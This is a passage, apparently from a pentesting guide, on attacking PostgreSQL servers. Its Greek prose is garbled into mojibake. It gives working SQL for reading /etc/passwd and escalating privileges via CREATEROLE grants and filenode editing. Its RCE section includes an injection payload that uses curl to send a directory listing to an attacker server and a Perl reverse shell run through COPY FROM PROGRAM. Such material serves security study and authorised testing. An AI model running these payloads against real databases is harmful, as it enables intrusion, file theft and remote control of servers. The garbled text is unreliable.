COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
ÎÎ± Î¸Ï…Î¼Î¬ÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Î½ Î´ÎµÎ½ ÎµÎ¯ÏƒÏ„Îµ Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„Î·Ï‚ Î±Î»Î»Î¬ Î­Ï‡ÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± **CREATEROLE** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ **Î½Î± Î³Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚:**
```sql
GRANT pg_read_server_files TO username;
```
[**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ **Î¬Î»Î»ÎµÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ Ï„Î¿Ï… postgres** Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± **Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î® ÎµÎ¼Ï†Î¬Î½Î¹ÏƒÎ· Ï€ÎµÏÎ¹ÎµÏ‡Î¿Î¼Î­Î½Ï‰Î½ Ï†Î±ÎºÎ­Î»Î¿Ï…**. ÎœÏŒÎ½Î¿ **Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„ÎµÏ‚** ÎºÎ±Î¹ **Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î¼Îµ ÏÎ·Ï„Î­Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚** Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï„Î¹Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ **Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚** ÏƒÏ„Î¿ [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Î‘Ï€Î»Î® Î•Î³Î³ÏÎ±Ï†Î® Î‘ÏÏ‡ÎµÎ¯Î¿Ï…

ÎœÏŒÎ½Î¿ **Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„ÎµÏ‚** ÎºÎ±Î¹ Î¼Î­Î»Î· Ï„Î¿Ï… **`pg_write_server_files`** Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® copy Î³Î¹Î± Ï„Î·Î½ ÎµÎ³Î³ÏÎ±Ï†Î® Î±ÏÏ‡ÎµÎ¯Ï‰Î½.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
ÎÎ± Î¸Ï…Î¼Î¬ÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Î½ Î´ÎµÎ½ ÎµÎ¯ÏƒÏ„Îµ Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„Î·Ï‚ Î±Î»Î»Î¬ Î­Ï‡ÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± **`CREATEROLE`** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ **Î½Î± Î³Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚:**
```sql
GRANT pg_write_server_files TO username;
```
[**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

ÎÎ± Î¸Ï…Î¼Î¬ÏƒÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ COPY Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ Î½Î­Î±Ï‚ Î³ÏÎ±Î¼Î¼Î®Ï‚, ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î±ÎºÏŒÎ¼Î· ÎºÎ¹ Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Îµ Î­Î½Î± payload base64 **Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Î¼Î¹Î± Î³ÏÎ±Î¼Î¼Î® ÎºÏÎ´Î¹ÎºÎ±**.\
ÎˆÎ½Î± Ï€Î¿Î»Ï ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏŒÏ‚ Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ®Ï‚ ÎµÎ¯Î½Î±Î¹ ÏŒÏ„Î¹ **Ï„Î¿ `copy` Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ ÎµÎ³Î³ÏÎ±Ï†Î® Î´Ï…Î±Î´Î¹ÎºÏÎ½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ ÎºÎ±Î¸ÏÏ‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÎµÎ¯ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Î´Ï…Î±Î´Î¹ÎºÎ­Ï‚ Ï„Î¹Î¼Î­Ï‚.**

### **ÎœÎµÏ„Î±Ï†ÏŒÏÏ„Ï‰ÏƒÎ· Î´Ï…Î±Î´Î¹ÎºÏÎ½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½**

Î©ÏƒÏ„ÏŒÏƒÎ¿, Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ **Î¬Î»Î»ÎµÏ‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î³Î¹Î± Ï„Î· Î¼ÎµÏ„Î±Ï†ÏŒÏÏ„Ï‰ÏƒÎ· Î¼ÎµÎ³Î¬Î»Ï‰Î½ Î´Ï…Î±Î´Î¹ÎºÏÎ½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Î£Ï…Î¼Î²Î¿Ï…Î»Î® bug bounty**: **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ** ÏƒÏ„Î¿ **Intigriti**, Î¼Î¹Î± Ï€ÏÎ¿Î·Î³Î¼Î­Î½Î· **Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î± Î±Î½Ï„Î±Î¼Î¿Î¹Î²Î®Ï‚ ÎµÏ…ÏÎ·Î¼Î¬Ï„Ï‰Î½ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¼Î­Î½Î· Î±Ï€ÏŒ Ï‡Î¬ÎºÎµÏÏ‚, Î³Î¹Î± Ï‡Î¬ÎºÎµÏÏ‚**! Î“Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ ÏƒÏ„Î¿ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) ÏƒÎ®Î¼ÎµÏÎ± ÎºÎ±Î¹ Î±ÏÏ‡Î¯ÏƒÏ„Îµ Î½Î± ÎºÎµÏÎ´Î¯Î¶ÎµÏ„Îµ Î±Î½Ï„Î±Î¼Î¿Î¹Î²Î­Ï‚ Î­Ï‰Ï‚ ÎºÎ±Î¹ **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### Î•Î½Î·Î¼Î­ÏÏ‰ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï€Î¯Î½Î±ÎºÎ± PostgreSQL Î¼Î­ÏƒÏ‰ ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ Ï„Î¿Ï€Î¹ÎºÎ¿Ï Î±ÏÏ‡ÎµÎ¯Î¿Ï…

Î•Î¬Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î¹Ï‚ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„ÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Î³Î¹Î± Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± Î³ÏÎ¬ÏˆÎµÏ„Îµ Î±ÏÏ‡ÎµÎ¯Î± ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„Î·Ï„Î® PostgreSQL, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÏ„Îµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Ï€Î¯Î½Î±ÎºÎ± ÏƒÏ„Î¿Î½ ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„Î·Ï„Î® Î¼Îµ Ï„Î¿ **Î±Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î¿Ï… ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï…** ÏƒÏ„Î¿ [ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï„Î¿Ï… PostgreSQL](https://www.postgresql.org/docs/8.1/storage.html). **Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î³Î¹Î± Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ®** [**ÎµÎ´Ï**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Î‘Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½Î± Î²Î®Î¼Î±Ï„Î±:

1. Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï„Î¿Ï… PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ·:** Î•Î¬Î½ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎ± Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï„Î¿Ï… ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï… Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î±Ï€ÏŒ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÏÏ‰Ï„Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎºÏÏÎ¹Î± Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… PostgreSQL Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î¿Ï‚ `SELECT version()` ÎºÎ±Î¹ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î¼Îµ brute-force Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î®. ÎŸÎ¹ ÏƒÏ…Î½Î®Î¸ÎµÎ¹Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚ ÎºÎ±Ï„Î±Î»ÏŒÎ³Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÎµ ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÎ¹Ï‚ Unix Ï„Î¿Ï… PostgreSQL ÎµÎ¯Î½Î±Î¹ `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. ÎˆÎ½Î± ÏƒÏ…Î½Î·Î¸Î¹ÏƒÎ¼Î­Î½Î¿ ÏŒÎ½Î¿Î¼Î± cluster ÎµÎ¯Î½Î±Î¹ `main`.
2. Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Î¼Î¹Î± ÏƒÏ‡ÎµÏ„Î¹ÎºÎ® Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï€ÏÎ¿Ï‚ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ Î±ÏÏ‡ÎµÎ¯Î¿Ï…, ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î· Î¼Îµ Ï„Î¿Î½ ÏƒÏ„ÏŒÏ‡Î¿ Ï€Î¯Î½Î±ÎºÎ±

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Î‘Ï…Ï„ÏŒ Ï„Î¿ ÎµÏÏÏ„Î·Î¼Î± Î¸Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½ `base/3/1337`. Î— Ï€Î»Î®ÏÎ·Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î® ÏƒÏ„Î¿ Î´Î¯ÏƒÎºÎ¿ Î¸Î± ÎµÎ¯Î½Î±Î¹ `$DATA_DIRECTORY/base/3/1337`, Î´Î·Î»Î±Î´Î® `/var/lib/postgresql/13/main/base/3/1337`.
3. ÎšÎ±Ï„ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÏÎ½ `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```
4. Î›Î¬Î²ÎµÏ„Îµ Ï„Î¿Î½ Ï„ÏÏ€Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿ Î¼Îµ Ï„Î¿Î½ ÏƒÏ„ÏŒÏ‡Î¿ Ï€Î¯Î½Î±ÎºÎ±

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```
5. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) Î³Î¹Î± Î½Î± [ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ Î±ÏÏ‡ÎµÎ¯Î¿Ï…](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); Î¿ÏÎ¯ÏƒÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ boolean ÏƒÎ·Î¼Î±Î¯ÎµÏ‚ `rol*` ÏƒÎµ 1 Î³Î¹Î± Ï€Î»Î®ÏÎµÎ¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![Î•Ï€Î¯Î´ÎµÎ¹Î¾Î· PostgreSQL Filenode Editor](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)
6. Î•Ï€Î±Î½Î±Ï†Î¿ÏÏ„ÏÏƒÏ„Îµ Ï„Î¿Î½ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¼Î­Î½Î¿ ÎºÏŒÎ¼Î²Î¿ Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÏÎ½ `lo_*`, ÎºÎ±Î¹ Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÏ„Îµ Ï„Î¿ Î±ÏÏ‡Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ ÏƒÏ„Î¿ Î´Î¯ÏƒÎºÎ¿

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```
7. _(Î ÏÎ¿Î±Î¹ÏÎµÏ„Î¹ÎºÎ¬)_ ÎšÎ±Î¸Î±ÏÎ¯ÏƒÏ„Îµ Ï„Î· Î¼Î½Î®Î¼Î· cache Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Î­Î½Î± Î´Î±Ï€Î±Î½Î·ÏÏŒ ÎµÏÏÏ„Î·Î¼Î± SQL

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```
8. Î˜Î± Ï€ÏÎ­Ï€ÎµÎ¹ Ï„ÏÏÎ± Î½Î± Î´ÎµÎ¯Ï„Îµ ÎµÎ½Î·Î¼ÎµÏÏ‰Î¼Î­Î½ÎµÏ‚ Ï„Î¹Î¼Î­Ï‚ Ï€Î¯Î½Î±ÎºÎ± ÏƒÏ„Î¿ PostgreSQL.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î³Î¯Î½ÎµÏ„Îµ Ï…Ï€ÎµÏÎ´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±Î¶ÏŒÎ¼ÎµÎ½Î¿Î¹ Ï„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± `pg_authid`. **Î”ÎµÎ¯Ï„Îµ** [**Ï„Î·Î½ Î±ÎºÏŒÎ»Î¿Ï…Î¸Î· ÎµÎ½ÏŒÏ„Î·Ï„Î±**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE Ï€ÏÎ¿Ï‚ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î±**

Î‘Ï€ÏŒ Ï„Î·Î½ [Î­ÎºÎ´Î¿ÏƒÎ· 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), Î¼ÏŒÎ½Î¿ **Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„ÎµÏ‚** ÎºÎ±Î¹ Î¼Î­Î»Î· Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚ **`pg_execute_server_program`** Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Ï„Î¿ copy Î³Î¹Î± RCE (Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î¼Îµ ÎµÎ¾Ï…Ï€Î±ÎºÏ„Î®ÏÎ¹ÏƒÎ·:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
ÎÎ± Î¸Ï…Î¼Î¬ÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Î½ Î´ÎµÎ½ ÎµÎ¯ÏƒÏ„Îµ Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„Î·Ï‚ Î±Î»Î»Î¬ Î­Ï‡ÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± **`CREATEROLE`** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ **Î½Î± Î³Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Î‰ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ `multi/postgres/postgres_copy_from_program_cmd_exec` module Î±Ï€ÏŒ Ï„Î¿ **metasploit**.\
Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± [**ÎµÎ´Ï**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Î•Î½Ï Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ Ï‰Ï‚ CVE-2019-9193, Î· Postges Î´Î®Î»Ï‰ÏƒÎµ ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒ Î®Ï„Î±Î½ Î­Î½Î± [Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ ÎºÎ±Î¹ Î´ÎµÎ½ Î¸Î± Î´Î¹Î¿ÏÎ¸Ï‰Î¸ÎµÎ¯](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE Î¼Îµ Î“Î»ÏÏƒÏƒÎµÏ‚ PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE Î¼Îµ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚ PostgreSQL

Î‘Ï†Î¿Ï Î­Ï‡ÎµÏ„Îµ **Î¼Î¬Î¸ÎµÎ¹** Î±Ï€ÏŒ Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· Î±Î½Î¬ÏÏ„Î·ÏƒÎ· **Ï€ÏÏ‚ Î½Î± Î¼ÎµÏ„Î±Ï†Î¿ÏÏ„ÏÏƒÎµÏ„Îµ Î´Ï…Î±Î´Î¹ÎºÎ¬ Î±ÏÏ‡ÎµÎ¯Î±** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ **RCE Î¼Îµ Ï„Î· Î¼ÎµÏ„Î±Ï†ÏŒÏÏ„Ï‰ÏƒÎ· Î¼Î¹Î±Ï‚ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ·Ï‚ postgresql ÎºÎ±Î¹ Ï„Î· Ï†ÏŒÏÏ„Ï‰ÏƒÎ® Ï„Î·Ï‚**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE Î¼Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚ Ï„Î¿Ï… PostgreSQL

{% hint style="info" %}
ÎŸÎ¹ Î±ÎºÏŒÎ»Î¿Ï…Î¸Î¿Î¹ Î´Î¹Î±Î½ÏÏƒÎ¼Î±Ï„Î± RCE ÎµÎ¯Î½Î±Î¹ Î¹Î´Î¹Î±Î¯Ï„ÎµÏÎ± Ï‡ÏÎ®ÏƒÎ¹Î¼Î± ÏƒÎµ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± Ï€Î»Î±Î¯ÏƒÎ¹Î± SQLi, ÎºÎ±Î¸ÏÏ‚ ÏŒÎ»Î± Ï„Î± Î²Î®Î¼Î±Ï„Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„Î¿ÏÎ½ Î¼Î­ÏƒÏ‰ ÎµÎ¼Ï†Ï‰Î»Î¹Î±ÏƒÎ¼Î­Î½Ï‰Î½ Î´Î·Î»ÏÏƒÎµÏ‰Î½ SELECT
{% endhint %}

